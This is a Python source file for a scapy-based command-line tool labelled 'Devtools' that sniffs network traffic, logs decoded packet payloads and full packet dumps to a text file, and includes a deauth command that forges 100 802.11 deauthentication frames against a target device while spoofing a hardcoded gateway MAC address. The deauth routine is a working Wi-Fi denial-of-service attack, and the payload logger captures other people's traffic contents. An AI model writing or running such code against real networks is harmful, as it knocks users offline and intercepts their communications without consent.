import shutil
import cmd
import os
from scapy.all import sniff, Raw, Dot11, RadioTap, Dot11Deauth, sendp, IP, TCP, UDP

def print_banner():
    print(r" _____    _                                 _____      _       ______           _              _      ")
    print(r"|_   _|  (_)                               |  ___|    (_)      |  _  \         | |            | |     ")
    print(r"  | | ___ _  __ _ _____      ____ _ ___  | |__ _ __  ___  __ | | | |_____   _| |_ ___   ___ | |___  ")
    print(r"  | |/ _ \ |/ _` / __\ \ /\ / / _` / __| |  __| '_ \| \ \/ / | | | / _ \ \ / / __/ _ \ / _ \| / __| ")
    print(r"  | |  __/ | (_| \__ \\ V  V / (_| \__ \ | |__| |_) | |>  <  | |/ /  __/\ V /| || (_) | (_) | \__ \ ")
    print(r"  \_/\___| |\__,_|___/ \_/\_/ \__,_|___/ \____/ .__/|_/_/\_\ |___/ \___| \_/  \__\___/ \___/|_|___/ ")
    print(r"        _/ |                                  | |                                                   ")
    print(r"       |__/                                   |_|                                                   ")
    print("=" * shutil.get_terminal_size().columns)

class Devtools(cmd.Cmd):
    prompt = 'devtools>> '
    intro = 'Welcome to Tejaswas Devtools. Type "help" for available commands.'
    log_file = "sniff_log.txt"

    def __init__(self):
        super().__init__()
        print_banner()

    def _log_to_file(self, data):
        """Appends packet data to the text file."""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(data + "\n")

    def _packet_callback(self, packet):
        """Formatted display and automatic file logging."""
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            proto = "TCP" if packet.haslayer(TCP) else "UDP" if packet.haslayer(UDP) else "IP"
            
            payload = ""
            if packet.haslayer(Raw):
                # Decoding ensures we don't just see 'b\x00...' in our text file
                payload = packet[Raw].load.decode(errors='ignore').replace('\n', ' ').strip()
            
            log_entry = f"[{proto:^5}] {src:<15} -> {dst:<15} | {payload}"
            
            # Print to screen (truncated to fit terminal)
            term_width = shutil.get_terminal_size().columns
            print(log_entry[:term_width])
            
            # Save the full entry to the .txt file
            self._log_to_file(log_entry)

    def do_speak(self, message):
        print(message if message else "Usage: speak <message>")

    def do_sniff(self, arg):
        """Sniff X packets and save them to the file."""
        if arg.isdigit():
            count = int(arg)
            print(f"[*] Sniffing {count} packets. Logging to {self.log_file}...")
            sniff(count=count, prn=self._packet_callback, store=0)
        else:
            print("Error: Please enter a valid number. Example: sniff 10")

    def do_sniffing(self, arg):
        """Continuous sniffing and logging until Ctrl+C."""
        print(f"[*] Live capture started. Logging to: {os.path.abspath(self.log_file)}")
        print(f"{'PROTO':<7} {'SOURCE':<15}    {'DESTINATION':<15} | {'PAYLOAD'}")
        print("-" * shutil.get_terminal_size().columns)
        try:
            sniff(prn=self._packet_callback, store=0)
        except KeyboardInterrupt:
            print(f"\n[*] Capture stopped.")

    def do_dump(self, arg):
        """Dumps full packet hex/structure to the file."""
        count = int(arg) if arg.isdigit() else 1
        print(f"[*] Dumping {count} detailed packets to {self.log_file}...")
        
        def dump_logic(pkt):
            details = pkt.show(dump=True)
            self._log_to_file("\n" + "="*30 + " PACKET DUMP " + "="*30 + "\n" + details)

        sniff(count=count, prn=dump_logic)
        print("[+] Detailed dump complete.")

    def do_clear(self, arg):
        """Clears the log file."""
        open(self.log_file, 'w').close()
        print(f"[*] {self.log_file} has been cleared.")

    def do_deauth(self, arg):
        target_mac = arg if arg else "00:ae:fa:81:e2:5e"
        gateway_mac = "e8:94:f6:c4:97:3f"
        
        print(f"[*] Sending 100 deauth packets to {target_mac}...")
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        
        try:
            sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
        except Exception as e:
            print(f"[!] Error: {e}")

    def do_exit(self, arg):
        print("Exiting...")
        return True

if __name__ == '__main__':
    Devtools().cmdloop()